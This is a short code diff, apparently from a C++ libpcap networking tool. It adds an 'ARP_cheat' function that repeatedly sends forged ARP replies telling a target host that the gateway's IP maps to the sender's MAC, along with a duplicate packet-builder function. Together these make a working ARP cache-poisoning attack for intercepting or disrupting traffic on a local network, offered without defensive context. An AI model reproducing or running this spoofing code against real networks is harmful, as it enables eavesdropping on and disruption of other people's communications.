@@ -15,6 +15,21 @@ void ARP_MakePackage(char * pData,u_int opcode,MAC srcMAC,MAC dstMAC,unsigned lo
 	pARPHeader->MAC_target=dstMAC;
 	pARPHeader->IP_target=dstIP;
 }
+void ARP_MakeCheatPackage(char * pData,u_int opcode,MAC srcMAC,MAC dstMAC,unsigned long srcIP,unsigned long dstIP){
+	unsigned int package_size=sizeof(MACHeader)+sizeof(ARPHeader);
+	MAC_MakePackage(pData,srcMAC,dstMAC,MAC_PROTOCOL_TYPE_ARP);	
+	ARPHeader * pARPHeader=(ARPHeader *)(pData+sizeof(MACHeader));
+	pARPHeader->hardware_type=0x0100;
+	pARPHeader->protocol_type=0x0008;
+	pARPHeader->hardware_size=6;
+	pARPHeader->protocol_size=4;
+	pARPHeader->opcode=opcode;
+	pARPHeader->MAC_sender=srcMAC;
+
+	pARPHeader->IP_sender=srcIP;
+	pARPHeader->MAC_target=dstMAC;
+	pARPHeader->IP_target=dstIP;
+}
 //This will set the forground color for printing in a console window.
 void SetColor(int ForgC)
 {
@@ -63,4 +78,12 @@ char * package_Receive(pcap_t * fp){
 	res=(char*)pcap_next(fp, &header);
 	if(res!=NULL)package_print(res,header.len);
 	return res;
+}
+void ARP_cheat(pcap_t * fp,unsigned long targetIP,unsigned long gateIP,MAC myMAC,MAC targetMAC,MAC gateMAC){
+	unsigned int package_size=sizeof(MACHeader)+sizeof(ARPHeader);
+	char * pData=new char[package_size];
+	ARP_MakePackage(pData,ARP_OP_REPLY,myMAC,targetMAC,gateIP,getIP("0.0.0.0"));
+	while(1){
+		send_raw_package(fp,(u_char *)pData,package_size,1);
+	}
 }
